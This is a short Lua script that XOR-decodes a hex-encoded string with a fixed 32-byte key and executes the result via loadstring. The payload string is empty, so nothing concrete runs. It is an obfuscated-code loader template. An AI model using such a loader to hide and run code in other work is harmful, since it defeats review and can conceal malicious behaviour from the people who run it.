local k={104,239,76,227,192,192,195,101,163,186,88,253,46,158,72,224,209,106,106,241,66,140,75,7,97,228,7,140,26,226,179,188}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
